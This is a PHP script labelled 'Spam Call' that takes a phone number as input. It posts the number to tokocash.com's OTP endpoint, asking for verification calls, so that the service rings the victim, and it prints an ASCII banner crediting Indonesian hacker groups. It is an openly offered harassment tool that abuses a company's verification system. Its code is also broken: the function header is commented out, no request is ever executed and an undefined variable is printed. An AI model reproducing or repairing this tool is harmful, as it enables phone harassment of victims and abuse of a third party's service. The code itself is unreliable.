<?php                                                                                   
 // Limit 3x Telpon Setiap Satu Nomor   
 //coding By Root@Kandol
 //Jangan di Recode Ea Bangsad                                                 
 // function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);                                                 
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");        
        curl_close($ch);
echo $asw."\n";
system ( 'clear' ) ;
                                                                                         
                                                                                         
                                                                                         
echo "  _____                          _____      _ _  \n" ;                             
echo " / ____|                        / ____|    | | | \n" ;
echo "| (___  _ __   __ _ _ __ ___   | |     __ _| | | \n" ;
echo " \___ \| '_ \ / _` | '_ ` _ \  | |    / _` | | | \n" ;                             
echo " ____) | |_) | (_| | | | | | | | |___| (_| | | | \n" ;
echo "|_____/| .__/ \__,_|_| |_| |_|  \_____\__,_|_|_| \n" ;
echo "       | | \n" ;
echo "       |_| \n" ;                                                                   
echo "================================================= \n" ;
echo "                                                  \n" ;
echo " _  __           _   _ ____     ____   _          \n" ;
echo "| |/ /    /\    | \ | |  __ \ /  __ \ | |         \n" ;
echo "| ' /    /  \   |  \| | | |  \| | |  || |         \n" ;
echo "|  <    / /\ \  | . ` | | |  || | |  || |         \n" ;
echo "|  .\  / /__\ \ | | \ | |_|  || |_|  || |___      \n" ;
echo "|_|\_\/_/    \_\|_| \_|_____/ \_____/ |_____|     \n" ;
echo "                     \n " ;
echo "================================================= \n" ;
echo "Author    : Root./Kandol \n" ;
echo "contact   : Kandoljr701@gmail.com \n" ;
echo "version   : 1.0 \n" ;
echo " \n" ;
echo "thank Team : Ali Attacker Team \n" ;
echo "             Indonesian Fighter Cyber \n" ;
echo "             Indonesian Termux Asosian \n" ;
echo "             Manusia Biasa Team \n" ;
echo "             HaxorScurity \n" ;
echo "             Forum Indores \n" ;
echo "             Mouse Cyber Security \n" ;
echo "             SecurityDarknet \n" ;
echo "             Drak 3xploit Cyber \n" ;
echo "             BlackHat Hacker Indonesia \n" ;
echo "   \n" ;
echo "[====================================================== \n" ;
echo " \n" ;
echo "Nomor\ninput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
